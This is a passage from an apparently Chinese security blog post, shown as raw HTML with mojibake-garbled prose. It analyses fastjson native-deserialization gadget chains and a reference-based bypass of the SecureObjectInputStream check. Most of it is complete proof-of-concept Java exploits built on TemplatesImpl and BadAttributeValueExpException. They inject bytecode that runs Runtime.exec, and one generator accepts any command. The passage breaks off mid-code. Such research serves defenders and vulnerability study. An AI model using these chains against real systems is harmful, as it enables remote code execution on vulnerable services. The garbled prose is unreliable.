src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733913060988-cfbcf78c-4a90-4b41-97f6-5a00c53be716.png"></p><p>å¯ä»¥çœ‹åˆ°JSONç±»ä¸­æ˜¯æœ‰toStringæ–¹æ³•çš„å¹¶ä¸”è°ƒç”¨äº†toJSONStringæ–¹æ³•ï¼Œè€Œæˆ‘ä»¬çŸ¥é“è¿™ä¸ªæ–¹æ³•æ˜¯ä¼šè§¦å‘getteræ–¹æ³•çš„ã€‚æ‰€ä»¥æ€è·¯å¾ˆæ˜ç¡®äº†æ‰¾åˆ°ä¸€ä¸ªèƒ½å¤ŸreadObjectçš„ç±»ï¼Œè°ƒç”¨toStringæ–¹æ³•ï¼Œç„¶åè°ƒç”¨toJSONStringæ–¹æ³•ï¼Œå†è°ƒç”¨getterï¼Œå®ç°ååºåˆ—åŒ–åˆ©ç”¨ã€‚</p><p>çœ‹å¸ˆå‚…ä»¬åˆ†æçš„åšå®¢å‘ç°æ˜¯åˆ©ç”¨çš„cc5é“¾çš„BadAttributeValueExpExeptionä¸­çš„readObjectæ–¹æ³•è°ƒç”¨äº†toStringæ–¹æ³•è¿›è¡Œè°ƒç”¨ï¼ŒååŠéƒ¨åˆ†çš„getæ˜¯åˆ©ç”¨é“¾templatesé“¾è¿›è¡ŒåŠ¨æ€åŠ è½½å› ä¸º</p><p>temaplatesé‡Œæœ‰getOutputPropertyæ–¹æ³•å¯ä»¥è§¦å‘ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733916463289-c0a099b1-3d2b-47f2-a3ad-1883025177a4.png"></p><p>å¯ä»¥çœ‹åˆ°BadAttributeValueExpExeptionç±»ä¸­çš„readObjectæ–¹æ³•è°ƒç”¨äº†toStringæ–¹æ³•ã€‚</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>mavenä¾èµ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;<span class="number">3.19</span><span class="number">.0</span>-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"> &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.2</span><span class="number">.48</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>fastjson1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -na Calculator\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;y4tacker&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(val, jsonArray);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(val);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>fastjson2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson2.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -na Calculator\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;y4tacker&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(val, jsonArray);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(val);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="fastjsonåŸç”Ÿååºåˆ—åŒ–1-2-49ç»•è¿‡"><a href="#fastjsonåŸç”Ÿååºåˆ—åŒ–1-2-49ç»•è¿‡" class="headerlink" title="fastjsonåŸç”Ÿååºåˆ—åŒ–1.2.49ç»•è¿‡"></a>fastjsonåŸç”Ÿååºåˆ—åŒ–1.2.49ç»•è¿‡</h2><p>ä»1.2.49å¼€å§‹ï¼Œæˆ‘ä»¬çš„JSONArrayä»¥åŠJSONObjectæ–¹æ³•å¼€å§‹çœŸæ­£æœ‰äº†è‡ªå·±çš„readObjectæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733917133612-8a27bbe1-a04e-4023-8195-fab843ad3704.png"></p><p>åœ¨å…¶<code>SecureObjectInputStream</code>ç±»å½“ä¸­é‡å†™äº†<code>resolveClass</code>,åœ¨å…¶ä¸­è°ƒç”¨äº†<code>checkAutoType</code>æ–¹æ³•åšç±»çš„æ£€æŸ¥</p><p>å…·ä½“è°ƒç”¨æµç¨‹å‚è€ƒï¼šy4å¸ˆå‚…çš„åšå®¢ï¼š</p><p><a href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/#%E5%9B%9E%E9%A1%BE">https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/#%E5%9B%9E%E9%A1%BE</a></p><h3 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡:"></a>ç»•è¿‡:</h3><ul><li>æ‰€ä»¥æˆ‘ä»¬çš„é‡ç‚¹å°±æ˜¯å¦‚ä½•åœ¨JSONArray&#x2F;JSONObjectå¯¹è±¡ååºåˆ—åŒ–æ¢å¤å¯¹è±¡æ—¶ï¼Œè®©æˆ‘ä»¬çš„æ¶æ„ç±»æˆä¸ºå¼•ç”¨ç±»å‹ä»è€Œç»•è¿‡resolveClassçš„æ£€æŸ¥</li><li>å½“å‘Listã€setã€mapç±»å‹ä¸­æ·»åŠ åŒæ ·å¯¹è±¡æ—¶å³å¯æˆåŠŸåˆ©ç”¨ï¼Œå½“æˆ‘ä»¬å†™å…¥å¯¹è±¡æ—¶ï¼Œä¼šåœ¨<code>handles</code>è¿™ä¸ªå“ˆå¸Œè¡¨ä¸­å»ºç«‹ä»å¯¹è±¡åˆ°å¼•ç”¨çš„æ˜ å°„,å½“å†æ¬¡å†™å…¥åŒä¸€å¯¹è±¡æ—¶ï¼Œåœ¨<code>handles</code>è¿™ä¸ªhashè¡¨ä¸­æŸ¥åˆ°äº†æ˜ å°„ï¼Œé‚£ä¹ˆå°±ä¼šé€šè¿‡<code>writeHandle</code>å°†é‡å¤å¯¹è±¡ä»¥å¼•ç”¨ç±»å‹å†™å…¥</li></ul><p>y4å¸ˆå‚…çš„æµç¨‹æ€»ç»“</p><p>åºåˆ—åŒ–æ—¶ï¼Œåœ¨è¿™é‡Œtemplateså…ˆåŠ å…¥åˆ°arrayListä¸­ï¼Œåé¢åœ¨JSONArrayä¸­å†æ¬¡åºåˆ—åŒ–TemplatesImplæ—¶ï¼Œç”±äºåœ¨<code>handles</code>è¿™ä¸ªhashè¡¨ä¸­æŸ¥åˆ°äº†æ˜ å°„ï¼Œåç»­åˆ™ä¼šä»¥å¼•ç”¨å½¢å¼è¾“å‡º</p><p>ååºåˆ—åŒ–æ—¶ArrayListå…ˆé€šè¿‡readObjectæ¢å¤TemplatesImplå¯¹è±¡ï¼Œä¹‹åæ¢å¤BadAttributeValueExpExceptionå¯¹è±¡ï¼Œåœ¨æ¢å¤è¿‡ç¨‹ä¸­ï¼Œç”±äºBadAttributeValueExpExceptionè¦æ¢å¤valå¯¹åº”çš„JSONArray&#x2F;JSONObjectå¯¹è±¡ï¼Œä¼šè§¦å‘JSONArray&#x2F;JSONObjectçš„readObjectæ–¹æ³•ï¼Œå°†è¿™ä¸ªè¿‡ç¨‹å§”æ‰˜ç»™<code>SecureObjectInputStream</code>ï¼Œåœ¨æ¢å¤JSONArray&#x2F;JSONObjectä¸­çš„TemplatesImplå¯¹è±¡æ—¶ï¼Œç”±äºæ­¤æ—¶çš„ç¬¬äºŒä¸ªTemplatesImplå¯¹è±¡æ˜¯å¼•ç”¨ç±»å‹ï¼Œé€šè¿‡readHandleæ¢å¤å¯¹è±¡çš„é€”ä¸­ä¸ä¼šè§¦å‘resolveClassï¼Œç”±æ­¤å®ç°äº†ç»•è¿‡</p><p>å½“ç„¶å‰é¢ä¹Ÿæåˆ°äº†ä¸ä»…ä»…æ˜¯Listï¼ŒSetä¸Mapç±»å‹éƒ½èƒ½æˆåŠŸè§¦å‘å¼•ç”¨ç»•è¿‡ã€‚</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>maven</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.83</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.27</span><span class="number">.0</span>-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hashmapå¼•ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Y4HackJSON</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] genPayload(String cmd) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        clazz.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;genPayload(<span class="string">&quot;open -na Calculator&quot;</span>)&#125;);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setValue(bd,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(templates,bd);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>arraylistå¼•ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> 